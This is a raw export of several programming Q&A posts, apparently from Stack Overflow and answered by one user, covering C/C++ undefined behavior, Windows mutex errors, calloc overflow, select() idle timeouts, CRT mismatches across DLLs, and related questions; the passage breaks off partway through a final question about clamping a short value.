<p>These all talk about not two pointers being in the same ""array"". Does that actually mean a plain old C array on the stack?</p>

<p>If it is undefined, it seems very odd to me… Why force me to carry along a counter variable when I have access to one constant pointer and one moving pointer?</p>
","9530","","<p>It's defined behavior, as long as you don't go farther than one element past the end of the array.  C99 §6.5.6/8 says this about adding a pointer and an integer:</p>

<blockquote>
  <p>[...] If both the pointer
  operand and the result point to elements of the same array object, or one past the last
  element of the array object, the evaluation shall not produce an overﬂow; otherwise, the
  behavior is undeﬁned. [...]</p>
</blockquote>

<p>And paragraph 9, on subtraction:</p>

<blockquote>
  <p>9) When two pointers are subtracted, both shall point to elements of the same array object,
  or one past the last element of the array object; [...]</p>
</blockquote>

<p>And from §7.20.3/1:</p>

<blockquote>
  <p>The pointer returned if the allocation
  succeeds is suitably aligned so that it may be assigned to a pointer to any type of object
  and then used to access such an object or an array of such objects in the space allocated
  (until the space is explicitly deallocated).</p>
</blockquote>

<p>So once you move <code>ptr</code> to point beyond the element after the last array element, doing the pointer subtraction is undefined behavior.</p>

<p>I do believe there are systems out there that would behave badly with this code, although I can't name any.  In theory, <code>malloc()</code> could return a pointer to just before the end of addressable memory, e.g. if you ask for 255 bytes it could return 0xFFFFFF00 on a 32-bit system, so creating a pointer beyond the end will lead to overflow.  It's also possible that integer overflow on pointer representations can trigger a trap of some sort (e.g. if pointers are stored in special registers).  While I don't know of any systems with these properties, the C standard certainly allows for their existence.</p>
"
"<p>I've the following code...</p>

<p>On one machine it throws ERROR_ACCESS_DENIED and on other it throws ERROR_ALREADY_EXISTS (Handle is not NULL). I'd like to understand why two different behaviors. On both the machines user is a domain user part of local system administrators group. I tried running three instances simultaneously.</p>

<hr>

<pre><code>#include &lt;windows.h&gt;
#include&lt;iostream&gt;
using namespace std;

void * _hMutex = NULL;

void createMyMutex()
{
    _hMutex = CreateMutex( 
            NULL,              // default security attributes
            false,             // initially not owned
            L""LockTest"");      // named mutex

        if (_hMutex == NULL) 
        {
            cout&lt;&lt; GetLastError()&lt;&lt; "" Error creating mutex handle""&lt;&lt;endl;
            Exit(0);
        }
        if(GetLastError() == ERROR_ALREADY_EXISTS)
        {
            cout&lt;&lt; GetLastError()&lt;&lt; "" Mutex already created"" &lt;&lt;endl;
        }   
}

void Lock()
{
    cout&lt;&lt;""Acquiring Lock...""&lt;&lt; endl;
    if(_hMutex != NULL)
        WaitForSingleObject(_hMutex, INFINITE);
    cout&lt;&lt; ""Acquired Lock."" &lt;&lt;endl;
}

void Unlock()
{
cout&lt;&lt; ""Releasing Lock..."" &lt;&lt;endl;
    if(_hMutex != NULL)
       ReleaseMutex(_hMutex);
}


int main(int argc, char* argv[])
{

    cout&lt;&lt;""Creating lock""&lt;&lt;endl;
    createMyMutex();
    cout&lt;&lt;""Lock create success""&lt;&lt;endl;

    cout&lt;&lt;""Taking lock""&lt;&lt;endl;
    Lock();
    cout&lt;&lt;""Got the lock""&lt;&lt;endl;

    cout&lt;&lt;""Waiting for 20 seconds""&lt;&lt;endl;
    Sleep(20000);
    cout&lt;&lt;""Wait over""&lt;&lt;endl;


    cout&lt;&lt;""Releasing lock""&lt;&lt;endl;
    Unlock();
    cout&lt;&lt;""Lock released successfully""&lt;&lt;endl;

    cout&lt;&lt;""exiting the program""&lt;&lt;endl;
    return 0;
    }
</code></pre>

<hr>
","9530","","<p>From <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682411%28v=vs.85%29.aspx"" rel=""nofollow"">MSDN</a>:</p>

<blockquote>
  <p>If the mutex is a named mutex and the object existed before this function call, the return value is a handle to the existing object, GetLastError returns <code>ERROR_ALREADY_EXISTS</code>, <em>bInitialOwner</em> is ignored, and the calling thread is not granted ownership. However, if the caller has limited access rights, the function will fail with <code>ERROR_ACCESS_DENIED</code> and the caller should use the OpenMutex function.</p>
</blockquote>

<p>So try using <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684315%28v=vs.85%29.aspx"" rel=""nofollow""><code>OpenMutex</code></a> instead with just the <code>SYNCHRONIZE</code> access right.</p>

<p>Also note that the Windows type <code>BOOL</code> is different from the C++ type <code>bool</code>.  So you should use the corresponding values <code>TRUE</code> and <code>FALSE</code> when calling Windows API functions that take <code>BOOL</code>, <strong>not</strong> <code>true</code> and <code>false</code>.</p>
"
"<p>Is it possible to redefine a c++ keyword using #define?</p>

<pre><code>#ifdef int
#undef int 
#define int 2
#endif
int main(){
    //Do something with int
}
</code></pre>

<p>I can't see the output in this case but i want to understand what happens internally. The reason I don't have #define is that I found that it is possible to #define a reserved keyword if you don't use a standard header file. I also tried to do run the following code.</p>

<pre><code>#include&lt;iostream&gt;
using namespace std;
#ifdef int
#undef int 
#endif
int main(){
    cout&lt;&lt;int;
}
</code></pre>

<p>But te above throws the error at cout line.</p>
","9530","","<p>Is it possible?  Yes.  Is it good style?  Absolutely not.</p>

<p>The preprocessor is not aware of C/C++ keywords, it only knows about preprocessor tokens and just does strict text replacement.</p>

<p>Your example is resulting in an error because you're <code>#undef</code>ing it.  Once you undefine it, it reverts to its previous behavior.</p>

<p>The only valid use I know of for doing something like this is to <a href=""http://stackoverflow.com/questions/984878/what-is-the-possible-use-for-define-for-if-false-else-for"">work around a bug in an old compiler</a>, and that compiler is no longer relevant these days.</p>
"
"<p>I am working with code blocks using MinGW, and I have a coding project I've been working on for some time. The project I've been using has been console application, and the debug functions I have rely on printing to the console.</p>

<p>However, recently, I've tried to implement windows 'GetOpenFileName()' function to pull up an open file box so it'd be a lot easier for users to open files with. However, when using a project in console application with the headers included, the MinGW compiler acts like it can't find the function. I found however changing the project to win32 GUI allows the compiler to find the function (I don't entirely understand why but that's just me).</p>

<p>The problem is thus: I tried to output debug information to console, but of course now the application is win32 GUI, the console doesn't display and thus I cannot see the debug information, and I can't switch it back to console application or the windows open file box code won't compile. How do I both display the console and still allow the project to correctly compile the windows GUI code?</p>

<p>I cannot alter the debug functions or use different ones because they are written into all of the classes to assist with back-tracing errors and there are at least 43 files, most of which use the debug functionality.</p>
","9530","","<p>Use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms681944%28v=vs.85%29.aspx"" rel=""nofollow""><code>AllocConsole</code></a> to create a console within a GUI app.</p>
"
"<p>I want to understand exactly where the global variables are stored in my program. On the stack? On the heap? Somewhere else?</p>

<p>So for that I wrote this small code:</p>

<pre><code>int global_vector[1000000];
int main () {
    global_vector[0] = 1; // just to avoid a compilation warning
    while(true); // to give me time to check the amount of RAM used by my program
    return 0;
}
</code></pre>

<p>No matter how large I make <code>global_vector</code>, the program only uses a really tiny amount of RAM. I do not understand the reason for this. Could someone please explain?</p>
","9530","","<p>Global variables that are not given explicit initializers, like yours in this case, are initialized to 0's by default.  They are placed into an area of memory called the <a href=""http://en.wikipedia.org/wiki/.bss"" rel=""nofollow"">.bss segment</a>, and no additional data is stored in the object file/executable file indicating the initial value of the data (unlike explicitly initialized data, which has to have its initial value stored somewhere).</p>

<p>When the OS loads the program, it reads in the descriptions of all of the segments and allocates memory for that.  Since it knows that the .bss segment is initialized to all 0's, it can do a sneaky trick to avoid having to actually allocate tons of memory and then initialize it to all 0's: it allocates <em>address space</em> for the segment in the process's page table, but all of the pages point to the same page, filled with 0's.</p>

<p>That single zero-page is also set to read-only.  Then, if and when the process writes to some data in the .bss segment, a page fault occurs.  The OS intercepts the page fault, figures out what's going on, and then actually allocates unique memory for that page of data.  It then restarts the instruction, and the code continues on its merry way as if the memory had been allocated all along.</p>

<p>So, the end result is that if you have a zero-initialized global variable or array, each page-sized chunk of data (typically 4 KB) that never gets written to will never actually have memory allocated for it.</p>

<p>Note: I'm being a little fuzzy here with the word ""allocated"".  If you dig into this sort of thing, you're likely to encounter words such as ""reserved"" and ""committed"".  See <a href=""http://en.wikipedia.org/wiki/.bss"" rel=""nofollow"">this question</a> and <a href=""http://msdn.microsoft.com/en-us/library/ms810627.aspx"" rel=""nofollow"">this page</a> for more info on those terms in the context of Windows.</p>
"
"<p>I'm currently writing an embedded application in C where performance is critical.</p>

<p>Currently, I'm allocating lots of empty memory like this: <code>calloc(1, num_bytes)</code> - however, I simply calculate <code>num_bytes</code> as the product of a number of items and the size of each item earlier in the code as it's code that used to call <code>malloc</code>.</p>

<p><code>calloc</code> seems unique in that it is the only memory allocation function of the -alloc family which takes two arguments for the size. Is there a good reason for doing this? Are there performance implications for specifying different arguments? What was the rationale in choosing this argument layout?</p>
","9530","","<p>One advantage of having the separate arguments is that it automatically guards against integer overflow:</p>

<pre><code>// On a 32-bit system, the calloc will almost certainly fail, but the malloc
// will succeed to overflow, likely leading to crashes and/or security holes
// (e.g. if the number of items to allocate came from an untrusted source)
void *a = calloc(64, 67108865);  // 2^32/64 + 1
void *b = malloc(64 * 67108865);  // will allocate 64 bytes on 32-bit systems
</code></pre>

<p>For large allocations, there can also be a performance advantage of doing a <code>calloc</code> instead of a <code>malloc</code> and <code>memset</code> combination, since the <code>calloc</code> implementation can use its internal knowledge of the heap to avoid unnecessary work or have improved cache performance.</p>

<p>For example, if the allocator decides to use an OS function such as <a href=""http://linux.die.net/man/2/mmap"" rel=""nofollow""><code>mmap(2)</code></a> or <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa366887%28v=vs.85%29.aspx"" rel=""nofollow""><code>VirtualAlloc</code></a> to acquire more virtual address space, that memory will come pre-zeroed for security reasons.  See <a href=""http://stackoverflow.com/questions/2688466/why-mallocmemset-slower-than-calloc"">this question</a> for a detailed explanation.  For small allocations, you're unlikely to notice much of a difference.</p>

<p>Some <code>calloc</code> implementations just call <code>malloc</code> and <code>memset</code> internally, so there's no advantage other than a potential overflow check.</p>
"
"<p>I found my computer was using a lot of network bandwidth and I want to figure out which program is actually doing this in the background.</p>

<p>I did some research and I could not find any free software having the capability of recording the network usage of each the program; so I want to write a simple one myself.</p>

<p>I want to write it in C++ but I have no idea which API I can use.</p>

<p>Can you suggest any?</p>

<p>Thanks!</p>
","9530","","<p>Don't reinvent the wheel, use <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx"" rel=""nofollow"">Process Explorer</a>, <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx"" rel=""nofollow"">Process Monitor</a>, <a href=""http://www.wireshark.org/"" rel=""nofollow"">Wireshark</a>, and/or <a href=""http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/netstat.mspx?mfr=true"" rel=""nofollow"">netstat</a>.</p>
"
"<p>In the following code;</p>

<pre><code>all_digits = set(range(10))
print all_digits
for i in range(102,167):
    digits = set(k for k in (str(i)))
    if len(digits) != 3:
        continue
    print ""digits:"", digits
    remaining_digits = all_digits - digits
    print ""remaining:"", remaining_digits
</code></pre>

<p>The digits set contains 3 elements. I want a set difference of them, however, <code>remaining_digits</code> always have all digits. What am I doing wrong here?
Here is a sample from output I am getting;</p>

<pre><code>set([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])
digits: set(['1', '0', '2'])
remaining: set([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])
digits: set(['1', '0', '3'])
remaining: set([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])
digits: set(['1', '0', '4'])
remaining: set([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])
digits: set(['1', '0', '5'])
remaining: set([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])
digits: set(['1', '0', '6'])
remaining: set([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])
digits: set(['1', '0', '7'])
remaining: set([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])
digits: set(['1', '0', '8'])
remaining: set([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])
</code></pre>
","9530","","<p><code>all_digits</code> is a set of the ten integers <code>0</code> through <code>9</code>, whereas <code>digits</code> is a set of 1-character strings like <code>""0""</code>.  Since the types are different, the set difference doesn't work as expected.</p>

<p>To make it work like you want, either use all integers or use all strings, e.g.:</p>

<pre><code>all_digits = set(map(str, range(10)))
</code></pre>
"
"<p>I am looking for any C++ tools that will help me generate sine wave like fringe patterns onto a loaded image like so: </p>

<p><img src=""http://i.stack.imgur.com/QEyIW.png"" alt=""Sample Output""></p>

<p>Any ideas using other programming modes (scripts?) would also be useful. If any more information is requested, please let me know. </p>
","9530","","<p>You'll have to be more specific about exactly what you're looking for.  <a href=""http://www.imagemagick.org/Magick++/"" rel=""nofollow"">Magick++</a>, the C++ bindings for the <a href=""http://www.imagemagick.org/script/index.php"" rel=""nofollow"">ImageMagick</a> library, has a lot of tools for doing various types of image processing, but depending on your needs it may or may not be able to do what you want.</p>
"
"<p>I heard about compiler optimizations.</p>

<p>For example the one when:</p>

<pre><code>while(myBool)
    doStuff();
</code></pre>

<p>compiler knows you do not modify myBool inside a while loop, it just read myBool once and doesn't check it every time. </p>

<p>This can be affected by <code>volatile</code> keyword right?</p>

<p>So I have tried to ""trick"" compiler, it thinks value was not changed.</p>

<pre><code>int main()
{
    struct st 
    {
        int a;
        int b; //I want to make difference by writing volatile here
    }s;

    s.b = 1;

    while(s.b &gt; 0)
    {
        *((&amp;s.a)+1) = 0;
        std::cout &lt;&lt; ""test"" &lt;&lt; std::endl;
    }
}
</code></pre>

<p>But even with full optimizations turned on (vs2012), this does not trick the compiler. This is probably very lame trick :)</p>

<p>How can I trick it? Is it even possible?</p>

<p>My goal is to create simple single-threaded program, which prints ""test"" with <code>volatile</code> keyword used and prints infinite-times ""test"" without the keyword.  </p>

<p>EDIT: Unfortunately I am not good with assembler, so I really can not read if the memory reading was optimized out in the first place :)</p>
","9530","","<p>What you're doing is undefined behavior.  You can't access <code>s.b</code> by writing to <code>*((&amp;s.a)+1)</code> instead since there's no guarantee that <code>s.a</code> and <code>s.b</code> don't have any padding bytes between them.</p>

<p>If you want to force there to be no padding, look into your compiler options.  For GCC/Clang, you'd declare the structure with <a href=""http://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html"" rel=""nofollow""><code>__attribute__((packed))</code></a>.  For MSVC, you'd use the <a href=""http://msdn.microsoft.com/en-us/library/2e70t5y1%28v=vs.80%29.aspx"" rel=""nofollow""><code>#pragma pack</code> directive</a>.</p>

<p>There's no good reason to be accessing <code>s.b</code> through <code>s.a</code> using that code.  What you should really do in this case, assuming you have a good reason for not accessing <code>s.b</code> directly, is use an array (<code>volatile</code>, if need be).  Arrays are guaranteed to be contiguous in memory without needing special attributes/pragmas.</p>

<p>Furthermore, the compiler won't make certain optimizations in some cases: if <code>i</code> is a variable and you write to <code>a[i]</code> followed by a read of <code>a[1]</code>, the compiler can't assume that <code>a[1]</code> wasn't just written to, so it won't be able to cache it in a register.  Whereas if you have two unrelated variables <code>a</code> and <code>b</code> and you write to <code>*(&amp;a+1)</code> and then read from <code>b</code>, the compiler <em>will</em> assume that <code>b</code> was not just written to.  That's one very good reason why <code>*(&amp;a+1)</code> is undefined behavior, since it leads the compiler to make untrue assumptions and cause your program to behave in strange ways.</p>
"
"<p>How would the LHS be fixed in <a href=""http://macton.smugmug.com/gallery/8936708_T6zQX/1/593426709_ZX4pZ#!i=593420229&amp;k=v7zei"" rel=""nofollow"">this code</a>?</p>

<p>First, where does the LHS occur? I'm guessing it's in the <code>else if</code> by reading <code>s.r</code> a second time.</p>

<p>From what I've been reading about LHS I believe that adding a local would fix it:</p>

<pre><code>float radius = s.r;

if( d &lt;= -radius )
    ...
else if( d &gt;= radius)
    ...
</code></pre>

<p>But since &lt;= is a function what prevents &lt;= or any other function that takes the local as a reference from modifying it?</p>
","9530","","<p>It doesn't, look at <a href=""http://macton.smugmug.com/gallery/8936708_T6zQX/1/593426709_ZX4pZ#!i=607382246&amp;k=uJbp4"" rel=""nofollow"">the next slide</a>.  It causes a pipeline flush.  There's also a good chance there will be a branch misprediction.</p>
"
"<p>In C++, I want to be able to call a method in the same class without creating an object of the whole class. The class is huge and I do not want to create a huge memory location for an object. I am used to programming in C#.</p>

<p>In C# I could do this</p>

<pre><code>class test()
{
 private void A()
 {
    B();
 }

 private void B()
 {
    doSomething;
 }
}
</code></pre>

<p>in C++ I am under the impression I have to do.</p>

<pre><code>class test()
{
  public:
         static void A();
         void B();
};


 void test::A()
 {
    test t;
    t.B();
 }

 void test::B()
 {
    doSomething;
 }
}
</code></pre>

<p>I do not want to make B() static nor do I want to create and object of test because in reality my class is a lot larger than this, and creating a object of the class would use memory that I do not want to. </p>

<p>Is there a way I can accomplish what I could in C# in C++?</p>
","9530","","<p>No.  If B needs an object, you have to give it an object.  If B doesn't need an object, declare it <code>static</code>.  C# is no different -- in your example, <code>A</code> is not static so the object already exists.</p>
"
"<p>I am writing an Objective-C class that needs to make function calls on a C++ class instance. I found <a href=""http://www.zedkep.com/blog/index.php?/archives/247-Forward-declaring-C%20%20-classes-in-Objective-C.html"" rel=""nofollow"">this suggestion</a>, but if I try it I get an error for having an incomplete definition of type 'struct MyCPlusPlusClass'</p>

<pre><code>struct MyCPlusPlusClass;

typedef struct MyCPlusPlusClass MyCPlusPlusClass;

@interface MyBridgeClass() {
    MyCPlusPlusClass *my_CPlusPlus;
}

...

- (id)initWithMrGame:(MyCPlusPlusClass *)cPlusPlus
{
    self = [super init]; 
    if (self) {
        my_CPlusPlus = cPlusPlusClass;
        my_CPlusPlus-&gt;p_favorite_integer = 0; // Compiler error
    }
    return self;
}
</code></pre>

<p>The actual definition occurs in a .mm file that's generated by a pre-compiler, just to add another layer of challenge.</p>

<p>How might I get this to work?</p>

<p><strong>EDIT</strong>: Interpreting Adam's answer</p>

<pre><code>// in MyCode.h

struct MyCPlusPlusClass;  // Forward declaration, no need for #include/#import

@interface MyBridgeClass() {
    struct MyCPlusPlusClass *my_CPlusPlus;
}


// in MyCode.m
#include MyCode.h


// in BigGenerateFile.mm
class MyCPlusPlusClass;

class MyCPlusPlusClass { ... }
</code></pre>

<p>My goal is to be able to use MyCPlusPlusClass in MyCode.m, but I can't include the .mm file because the compiler gets very unhappy. It may be that the way this thing is architected is going to make me go a different route.</p>
","9530","","<p>You can't access member variables of incomplete structures/classes.  To do so, you need to the full definition.  Typically you use forward declarations in header files so that anything that includes that header doesn't pull in lots of unnecessary other header files it won't need, but for source files you usually need the full definitions.</p>

<p>So I'd suggest changing you code to something like this:</p>

<pre><code>// Header file (.h)
struct MyCPlusPlusClass;  // Forward declaration, no need for #include/#import

@interface MyBridgeClass() {
    struct MyCPlusPlusClass *my_CPlusPlus;
}

// Source file (.mm)
#include ""MyCPlusPlusClass.h""
...
// Can now access my_CPlusPlus-&gt;p_favorite_integer etc.
</code></pre>
"
"<p>C has never been a great force of mine, but I decided to give it a go. The following is my code, but when run, it gives a segmentation fault (core dumped).</p>

<p>Basically what I want, is to check if the folder is empty (mtp device mounted in it), and if it is empty, run the mount command, and if not, run the other command.</p>

<pre><code>#include &lt;sys/types.h&gt;
#include &lt;dirent.h&gt;
#include &lt;libgen.h&gt;
#include &lt;libnotify/notify.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

void main ()
{
  int n = 0;
  struct dirent *d;
  const char *dir_path=""~/Nexus"";
  DIR *dir = opendir(dir_path);
      while ((d = readdir(dir)) != NULL) {
        if(++n &gt; 2)
          break;
      }
      closedir(dir);
      if (n &lt;= 2) //Directory Empty
    {
    notify_init (""Galaxy Nexus mounter"");
    NotifyNotification * Mount = notify_notification_new (""Galaxy Nexus"", ""Mounted at ~/Nexus"", ""/home/tristan202/bin/test/android_on.png"");
    system(""jmtpfs ~/Nexus"");
    notify_notification_show (Mount, NULL);
    }
      else
    {
    notify_init (""Galaxy Nexus mounter"");
    NotifyNotification * uMount = notify_notification_new (""Galaxy Nexus"", ""Unmounted"", ""/home/tristan202/bin/test/android_off.png"");
    system(""fusermount -u ~/Nexus"");
    notify_notification_show (uMount, NULL);
    }
    }
</code></pre>

<p>Any suggestions are welcome.</p>

<p><strong>EDIT</strong></p>

<pre><code>#include &lt;sys/types.h&gt;
#include &lt;dirent.h&gt;
#include &lt;libgen.h&gt;
#include &lt;libnotify/notify.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main ()
{
  int n = 0;
  struct dirent *d;
  const char *dir_path=""/home/tristan202/Nexus"";
  DIR *dir = opendir(dir_path);
      while ((d = readdir(dir)) != NULL) {
        if(++n &gt; 2)
          break;
      }
      closedir(dir);
      if (n &lt;= 2) //Directory Empty
    {
    notify_init (""Galaxy Nexus mounter"");
    NotifyNotification * Mount = notify_notification_new (""Galaxy Nexus"", ""Mounted at ~/Nexus"", ""/home/tristan202/bin/test/android_on.png"");
    system(""jmtpfs ~/Nexus"");
    notify_notification_show (Mount, NULL);
    }
      else
    {
    notify_init (""Galaxy Nexus mounter"");
    NotifyNotification * uMount = notify_notification_new (""Galaxy Nexus"", ""Unmounted"", ""/home/tristan202/bin/test/android_off.png"");
    system(""fusermount -u ~/Nexus"");
    notify_notification_show (uMount, NULL);
    }
    }
</code></pre>
","9530","","<p>You have several problems:</p>

<ol>
<li>You don't check for errors.  If <code>opendir(2)</code> fails to open the directory and returns <code>NULL</code>, you keep going, and passing in <code>NULL</code> to <code>readdir(2)</code> will likely cause it to segfault.  This is probably failing because...</li>
<li>The file system doesn't understand what you mean when you write <code>""~""</code>, as in <code>""~/Nexus""</code>.  It tries to open a file <em>literally</em> named <code>""~/Nexus""</code>.  The <code>~</code> character has no special meaning in the file system -- it means something to the <em>shell</em>.  The shell is the one that performs <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Tilde-Expansion"" rel=""nofollow"">tilde expansion</a>.  In order to get the file you want, you need to either use the correct full, absolute path or a correct relative path; you can use <a href=""http://linux.die.net/man/3/getenv"" rel=""nofollow""><code>getenv(""HOME"")</code></a> to find your own home directory at runtime.  Note that it's ok to use <code>~</code> in the calls to the <code>system(3)</code> function, since <code>system</code> invokes the shell.</li>
<li><code>main()</code> is not declared correctly.  It must return <code>int</code>, not <code>void</code>.</li>
</ol>
"
"<p>I am building a webserver which can accept and handle multiple client connections. I'm using <code>select()</code> for this.<br>
Now while this is going on, if a particular connected socket hasn't had any activity (send or recv) on it, I want to close it. So if no requests come from a connected client for a period of time, I'll close the socket. There are multiple such connected sockets and I need to do this monitoring for each.</p>

<p>I need this functionality to create persistent connections as my webserver has to support HTTP 1.1</p>

<p>What is the best way to do this?</p>
","9530","","<p>I'd suggest setting the timeout of the call to <code>select</code> to be the minimum time until the next socket will timeout.  Then, if it timed out, close the idle sockets, and repeat.  Something like this pseudocode:</p>

<pre><code>timeout = default_timeout;
foreach(socket s)
{
    timeout = min(timeout, (s.last_send_or_recv_time + IDLE_TIMEOUT - now()));
}

result = select(..., timeout);
if(result == 0)
{
    foreach(socket s)
    {
        if(now() - s.last_send_or_recv_time &gt;= IDLE_TIMEOUT)
        {
            close(s);
            remove_from_socket_list(s);
        }
    }
}
else
{
    // Handle received data, update last_send_or_recv_time, etc.
}
</code></pre>
"
"<p>I'm writing a script that writes files in multiple languages including none ascii text therefore I'm writing the content in unicode. </p>

<p>Here is a print of the data: </p>

<pre><code>[['LATEST', u'\u0928\u0935\u0940\u0928\u0924\u092e'], ['RECOMMENDED', u'\u0938\u093f\u092b\u093e\u0930\u093f\u0936 \u0915\u093f\u092f\u093e \u0917\u092f\u093e']]
</code></pre>

<p>here is the code that I use to write :</p>

<pre><code>f = codecs.open(file,encoding='utf-8', mode='w')
f.write(el)
</code></pre>

<p>This works fine to have to text appear in Hindi in an text editor but because of the file format expected by the server, I need to directly write out </p>

<blockquote>
  <p>\u0928\u0935\u0940\u0928\u0924\u092e</p>
</blockquote>

<p>I'm currently running </p>

<pre><code>os.system(""native2ascii -encoding utf-8 ./output/nls_hi.properties ./output/nls_hi.properties"")
</code></pre>

<p>but this takes too much time and I can't help but think that there must be a way to directly write it the right way.</p>

<p>Ideas ? </p>

<p>Thanks</p>

<p>Jason</p>
","9530","","<p>What file format does the server expect?  Does it need a <a href=""http://en.wikipedia.org/wiki/Byte-order_mark"" rel=""nofollow"">byte-order mark</a> (BOM)?  Whatever the answer, it's easiest to just directly use <a href=""http://docs.python.org/library/stdtypes.html#str.encode"" rel=""nofollow""><code>str.encode</code></a>:</p>

<pre><code>data = u'text with Unicode chars etc.'
with open(filename, 'w') as f:
    # For UTF-8, no BOM:
    f.write(data.encode('utf-8')
</code></pre>

<p>For UTF-16, use <code>data.encode('utf-16')</code>, which will come with a BOM.  If you don't want a BOM, explicitly use either <code>utf-16le</code> (little-endian) or <code>utf-16be</code> (big-endian).</p>
"
"<p>I have this code:</p>

<pre><code>- (NSString *) calculate: (uint) position {
    static NSArray * localArray = [NSArray arrayWithArray: self.container.objects ];
    // some un related code
    return obj;
}
</code></pre>

<p>The compiler complains saying: ""Initializer element is not a compile-time constant"". It happened when I added ""static"" to localArray. But why?</p>
","9530","","<p>Because <code>[NSArray arrayWithArray: self.container.objects ]</code> isn't a compile-time constant, it's an expression that must be evaluated at runtime.  In C and Objective-C, <code>static</code> variables inside functions must be initialized with <em>compile-time</em> constants, whereas C++ and Objective-C++ are more lenient and allow non-compile-time constants.</p>

<p>Either compile your code as Objective-C++, or refactor it into something like this:</p>

<pre><code>static NSArray *localArray = nil;
if (localArray == nil)
    localArray = [NSArray arrayWithArray: self.container.objects ];
</code></pre>

<p>Which is fairly similar to the code that the compiler would generate under the hood for a <code>static</code> variable initialized with a non-compile-time constant anyways (in actuality, it would use a second global flag indicating if the value was initialized, rather than using a sentinel value like <code>nil</code> here; in this case, we are assuming that <code>localArray</code> will never be <code>nil</code>).  You can check out your compiler's disassembly for that if you want.</p>
"
"<p>I have a file pointer exported from a dll, which is initialized(fopen) by the application and then used(fprintf) inside the dll.</p>

<p>The problem is fprintf will throw an exception.</p>

<p><strong>DLLFile.c</strong></p>

<pre><code>#define BUILD_FOO
#include ""API.H""

File *pFile;

void exportedFunction()
{
   fprintf(pFile,""This will result in an exception\n"");//&lt;-This print will crash
}
</code></pre>

<p><strong>API.H</strong></p>

<pre><code>#ifdef BUILD_FOO
#    define FOOAPI __declspec(dllexport)
#else
#    define FOOAPI __declspec(dllimport)
#endif

FOOAPI  extern File *pFile;
FOOAPI  void exportedFunction();
</code></pre>

<p><strong>APLICATION.C</strong></p>

<pre><code>#undef BUILD_FOO
#include ""API.H""
void main()
{
pFile = fopen(""path_to_folder"",""wt"");
fprintf(pFile , ""This print will work""); // &lt;- This will be printed ok
exportedFunction(); 
}
</code></pre>

<p>1 From the debugging I've done, this is what I saw:</p>

<p>Inside the <strong>application, fopen()</strong> assigns for <strong>pFile</strong>  an element from <strong>_iob[]</strong>.</p>

<p>In the <strong>DLL</strong> when <strong>fprintf</strong> is called, it is checked that <strong>pFile</strong> is part of the <strong>_iob[]</strong>, but the <strong>_iob[]</strong> from the application seems not to be the same with the one in the DLL(they have different addresses).</p>

<p>2 I have the same  use case(with the same application) and another somewhat similar DLL, and everything works ok there(the _iob[] is at the same place in the application and DLL).</p>
","9530","","<p>This is likely being caused by your application and your DLL <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2006/09/15/755966.aspx"" rel=""nofollow"">disagreeing on which version of the C runtime they're using</a>.  Unless they're both compiled against the <strong>exact</strong> same version of the C runtime, all bets are off, and you can't call CRT functions from one using the data from another or vice-versa.</p>

<p>The safest way to avoid this problem is not to pass <code>FILE*</code> pointers across DLL boundaries.  That way, any interaction with a <code>FILE*</code> will always happen using the same version of the CRT, and there's no danger of any mismatches.  So your DLL should not expose a <code>FILE*</code> variable; instead it should be some opaque type, and all operations on the variable need to happen in the same module.</p>

<p>For example:</p>

<pre><code>// API.h
FOOAPI void set_file(void *file);
FOOAPI void set_fprintf_callback(int (*my_fprintf)(void *, const char *, ...));
FOOAPI void exportedFunction();

// DLLFile.c
void *pFile;  // Not exported
int (*fprintf_callback)(void *, const char *, ...);  // Not exported

FOOAPI set_file(void *file)
{
    pFile = file;
}

FOOAPI set_fprintf_callback(int (*my_fprintf)(void *, const char *, ...))
{
    fprintf_callback = my_fprintf;
}

FOOAPI exportedFunction()
{
    // Call back into the application to do the actual fprintf
    fprintf_callback(pFile, ""This should not crash"");
}

// Application.c
int mydll_fprintf(void *pFile, const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    int result = vfprintf((FILE *)pFile, fmt, ap);
    va_end(ap);

    return result;
}

int main()
{
    FILE *pFile = fopen(...);
    set_file(pFile);
    set_fprintf_callback(&amp;mydll_fprintf);
    exportedFunction();

    return 0;
}
</code></pre>
"
"<p>I have the following test program (demonstrates what I am really trying to accomplish).</p>

<p>Does anyone know if the following is possible without a reinterpret_cast&lt;>?</p>

<pre><code>struct B;

struct A {
  A() { }
  A( const B &amp;b) { }
  A( const B *b) { }
  A( B *b) { }

  A* operator=(const B *b) { }
  A* operator=(B *b) { }
};

struct B {
  B() { }
  B( const A &amp;a) { }
  B( const B * b) { }
  B( B *b) { }

  B* operator=(const A *a) { }
  B* operator=(A *a) { }
};

int main(int argc, char *argv[])
{
  A *a = new A();
  B *b = new B();

  A *c = b;

  return 0;
}
</code></pre>

<p>I tried doing every conversion operator I could, but I just can't seem to get</p>

<pre><code>  A *c = b;
</code></pre>

<p>to not complain</p>

<pre><code>error C2440: 'initializing' : cannot convert from 'B *' to 'A *'
</code></pre>
","9530","","<p>No, it's not possible, because a <code>B</code> is not an <code>A</code>.  You either need to use inheritance to make <code>B</code> a subclass of <code>A</code> (so that a <code>B</code> is an <code>A</code>), or use composition and then refer to the appropriate subobject.</p>
"
"<p>I want to constrain the value of a <code>signed short</code> variable between 0 and 4095, after which I take the most significant 8 bits as my final value for use elsewhere. Right now I'm doing it in a basic manner as below:</p>

<pre><code>short color     = /* some external source */;
/* 
 * I get the color value as a 16 bit signed integer from an
 * external source I cannot trust. 16 bits are being used here
 * for higher precision.
 */

if ( color &lt; 0 ) {
